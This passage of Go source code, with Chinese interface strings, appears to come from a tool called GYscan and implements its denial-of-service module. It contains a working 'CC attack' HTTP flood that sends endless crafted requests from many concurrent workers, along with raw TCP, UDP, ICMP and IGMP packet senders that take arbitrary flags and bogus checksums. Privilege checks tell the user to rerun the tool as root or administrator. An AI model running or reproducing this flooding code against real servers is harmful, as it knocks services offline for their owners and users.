		utils.SuccessPrint("总计发送: %d 包", packetsSent)
		if elapsed > 0 {
			utils.SuccessPrint("平均速率: %.2f pps", float64(packetsSent)/elapsed)
		}
	}
}

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) Mobile/15E148",
	"Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) Mobile/15E148",
}

var ccTurbo bool
var ccRequestsPerConn int
var ccNoKeepAlive bool

func runCCAttack(targetURL string, customPath string) {
	parsedURL := targetURL
	hasCustomPath := customPath != "" && customPath != "/"

	if hasCustomPath && !strings.Contains(targetURL, customPath) {
		if strings.HasSuffix(targetURL, "/") {
			parsedURL = targetURL + strings.TrimPrefix(customPath, "/")
		} else {
			parsedURL = targetURL + customPath
		}
	}

	parsed, err := url.Parse(parsedURL)
	if err != nil {
		utils.ErrorPrint("无效的URL: %v", err)
		return
	}

	if ccTurbo {
		runtime.GOMAXPROCS(runtime.NumCPU() * 2)
		utils.InfoPrint("Turbo模式: 使用 %d CPU核心", runtime.NumCPU()*2)
	}

	host := parsed.Host
	if ccHost != "" {
		host = ccHost
	}

	scheme := parsed.Scheme
	if scheme == "" {
		scheme = "http"
	}

	successCount := uint64(0)

	stopProgress := make(chan bool)
	go func() {
		lastSuccess := uint64(0)
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-stopProgress:
				return
			case <-ticker.C:
				current := atomic.LoadUint64(&successCount)
				if current > 0 {
					rate := float64(current - lastSuccess)
					utils.InfoPrint("成功: %d, QPS: %.0f", current, rate)
					lastSuccess = current
				}
			}
		}
	}()

	worker := func(wg *sync.WaitGroup) {
		defer wg.Done()

		for {
			url := parsedURL
			if ccRandomPath {
				randPath := fmt.Sprintf("/%d", rand.Intn(100000))
				if strings.Contains(url, "?") {
					url = url + "&r=" + fmt.Sprintf("%d", rand.Intn(100000))
				} else {
					url = url + randPath
				}
			}

			path := url
			if idx := strings.Index(url, host); idx > 0 {
				path = url[idx+len(host):]
				if path == "" || !strings.HasPrefix(path, "/") {
					path = "/"
				}
			} else {
				path = "/"
			}

			req := fmt.Sprintf("%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\nAccept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate\r\n",
				ccMethod, path, host, ccUserAgent)

			if ccMethod == "POST" && ccData != "" {
				req += fmt.Sprintf("Content-Type: %s\r\nContent-Length: %d\r\n", ccContentType, len(ccData))
			}

			if ccReferer != "" {
				req += fmt.Sprintf("Referer: %s\r\n", ccReferer)
			}
			if ccCookie != "" {
				req += fmt.Sprintf("Cookie: %s\r\n", ccCookie)
			}

			if ccNoKeepAlive {
				req += "Connection: close\r\n"
			} else {
				req += "Connection: keep-alive\r\n"
			}

			req += "\r\n"

			if ccMethod == "POST" && ccData != "" {
				req += ccData
			}

			conn, err := net.DialTimeout("tcp", parsed.Host, 3*time.Second)
			if err != nil {
				continue
			}

			conn.SetDeadline(time.Now().Add(5 * time.Second))

			_, err = conn.Write([]byte(req))
			if err != nil {
				conn.Close()
				continue
			}

			buf := make([]byte, 8)
			conn.Read(buf)
			conn.Close()

			atomic.AddUint64(&successCount, 1)
		}
	}

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go worker(&wg)
	}

	utils.InfoPrint("CC攻击进行中... 按 Ctrl+C 停止")
	utils.InfoPrint("并发: %d", workers)

	time.Sleep(100 * time.Millisecond)

	<-make(chan struct{})
}

func sendPacket(proto, targetIP, sourceIP string, sourcePort, destPort int, flags string, window, ttl, tos, payloadSize int, bogusChecksum bool, iface string) error {
	switch strings.ToUpper(proto) {
	case "TCP":
		return sendTCPPacket(targetIP, sourceIP, sourcePort, destPort, flags, window, ttl, tos, bogusChecksum, iface)
	case "UDP":
		return sendUDPPacket(targetIP, sourceIP, sourcePort, destPort, ttl, payloadSize, bogusChecksum, iface)
	case "ICMP":
		return sendICMPPacket(targetIP, sourceIP, ttl, payloadSize, iface)
	case "IGMP":
		return sendIGMPPacket(targetIP, sourceIP, ttl, iface)
	default:
		return fmt.Errorf("不支持的协议: %s", proto)
	}
}

func sendTCPPacket(targetIP, sourceIP string, sourcePort, destPort int, flags string, window, ttl, tos int, bogusChecksum bool, iface string) error {
	flagSet := parseTCPFlags(flags)

	srcPort := uint16(sourcePort)
	if srcPort == 0 {
		srcPort = uint16(1024 + randIntn(64511))
	}

	packet, err := buildTCPPacketFast(targetIP, srcPort, uint16(destPort), flagSet, uint16(window), ttl, uint8(tos), payloadSize, bogusChecksum)
	if err != nil {
		return err
	}

	return sendRawPacket(packet, iface)
}

func sendUDPPacket(targetIP, sourceIP string, sourcePort, destPort, ttl, payloadSize int, bogusChecksum bool, iface string) error {
	srcPort := uint16(sourcePort)
	if srcPort == 0 {
		srcPort = uint16(1024 + randIntn(64511))
	}

	packet, err := buildUDPPacketFast(targetIP, srcPort, uint16(destPort), ttl, payloadSize, bogusChecksum)
	if err != nil {
		return err
	}

	return sendRawPacket(packet, iface)
}

func sendICMPPacket(targetIP, sourceIP string, ttl, payloadSize int, iface string) error {
	packet, err := buildICMPPacketFast(targetIP, ttl, payloadSize)
	if err != nil {
		return err
	}

	return sendRawPacket(packet, iface)
}

func sendIGMPPacket(targetIP, sourceIP string, ttl int, iface string) error {
	ip := net.ParseIP(targetIP)
	if ip == nil {
		return fmt.Errorf("无效的目标IP地址: %s", targetIP)
	}

	packet := buildIGMPPacket(sourceIP, targetIP, ttl)

	return sendRawPacket(packet, iface)
}

func parseTCPFlags(flags string) uint8 {
	var result uint8
	flagMap := map[string]uint8{
		"FIN": 0x01,
		"SYN": 0x02,
		"RST": 0x04,
		"PSH": 0x08,
		"ACK": 0x10,
		"URG": 0x20,
		"ECE": 0x40,
		"CWR": 0x80,
	}

	flagParts := strings.Split(strings.ToUpper(flags), "/")
	for _, part := range flagParts {
		part = strings.TrimSpace(part)
		if value, exists := flagMap[part]; exists {
			result |= value
		}
	}

	if result == 0 {
		result = 0x02
	}

	return result
}

func randIntn(n int) int {
	return int(time.Now().UnixNano()%int64(n)) + n/2
}

func checkWindowsAdmin() bool {
	if runtime.GOOS != "windows" {
		return true
	}

	cmd := exec.Command("net", "session")
	err := cmd.Start()
	if err != nil {
		return false
	}
	err = cmd.Wait()
	return err == nil
}

func checkPermissionAndWarn() bool {
	if runtime.GOOS == "windows" {
		if !checkWindowsAdmin() {
			utils.ErrorPrint("Windows平台需要管理员权限才能发送原始数据包!")
			utils.BoldInfo("请使用以下方式之一运行:")
			utils.InfoPrint("1. 右键点击命令行 -> '以管理员身份运行'")
			utils.InfoPrint("2. 使用管理员权限启动 PowerShell")
			utils.InfoPrint("3. 在任务管理器中以 SYSTEM 权限运行")
			utils.InfoPrint("")
			utils.InfoPrint("或者使用 CC 攻击模式 (不需要管理员权限):")
			utils.InfoPrint("  GYscan dos cc <url>")
			return false
		}
	} else {
		if os.Geteuid() != 0 {
			utils.ErrorPrint("需要root权限才能发送原始数据包!")
			utils.BoldInfo("请使用 sudo 运行:")
			utils.InfoPrint("  sudo %s dos %s", getProgramName(), target)
			return false
		}
	}
	return true
}
